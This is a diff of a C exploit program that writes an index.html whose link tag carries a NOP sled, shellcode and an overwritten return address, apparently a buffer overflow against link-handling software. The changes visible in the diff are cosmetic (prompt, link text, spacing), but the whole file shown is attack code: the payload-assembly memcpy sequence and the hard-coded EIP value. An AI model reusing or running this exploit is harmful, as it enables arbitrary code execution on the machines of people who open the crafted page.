@@ -5,11 +5,11 @@ Just a C version of Guido Landi's discovery.
 
 Written by r0ut3r (writ3r [at] gmail.com)
 
-kit:/home/r0ut3r/public_html # gcc -o intell intell.c
-kit:/home/r0ut3r/public_html # ./intell
+:/home/r0ut3r/public_html # gcc -o intell intell.c
+:/home/r0ut3r/public_html # ./intell
 [+] Building payload
 [+] Success writing to index.html
-kit:/home/r0ut3r/public_html #
+:/home/r0ut3r/public_html #
 */
 
 #include <stdio.h>
@@ -51,7 +51,7 @@ int main(void)
     char eip[4] = "\x23\x44\x06\x7d";
 
     char html[16] = "<a href='http://";
-    char chtml[11] = "'>yahhh</a>";
+    char chtml[11] = "'>aaaaa</a>";
 
     fp = fopen("index.html", "wb");
     if (fp == NULL)
@@ -62,10 +62,10 @@ int main(void)
 
     printf("[+] Building payload\n");
     memcpy(payload, html, sizeof(html));
-    memset(payload+sizeof(html), 0x90, 116);
-    memcpy(payload+sizeof(html)+116, shellcode, sizeof(shellcode));
-    memcpy(payload+sizeof(html)+116+sizeof(shellcode)-1, eip, sizeof(eip));
-    memcpy(payload+sizeof(html)+116+sizeof(shellcode)-1+sizeof(eip), chtml, sizeof(chtml));
+    memset(payload + sizeof(html), 0x90, 116);
+    memcpy(payload + sizeof(html) + 116, shellcode, sizeof(shellcode));
+    memcpy(payload + sizeof(html) + 116 + sizeof(shellcode) - 1, eip, sizeof(eip));
+    memcpy(payload + sizeof(html) + 116 + sizeof(shellcode) - 1 + sizeof(eip), chtml, sizeof(chtml));
 
     fprintf(fp, "%s", payload);
     if (fclose(fp) == 0)
